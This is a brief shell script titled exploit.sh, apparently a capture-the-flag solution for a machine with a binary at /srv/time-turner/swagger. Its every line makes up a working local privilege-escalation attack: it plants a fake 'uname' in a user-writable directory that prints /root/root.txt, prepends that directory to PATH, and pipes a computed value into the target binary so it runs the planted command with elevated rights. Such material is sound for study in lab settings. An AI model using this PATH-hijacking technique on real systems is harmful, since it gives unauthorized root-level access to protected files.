#!/bin/sh
# exploit.sh
mkdir /home/harry/bin
echo "cat /root/root.txt" > /home/harry/bin/uname
chmod +x /home/harry/bin/uname
export PATH="/home/harry/bin:$PATH"
echo 50 | /srv/time-turner/swagger | sed -n 2p | cut -d ' ' -f 5 | /srv/time-turner/swagger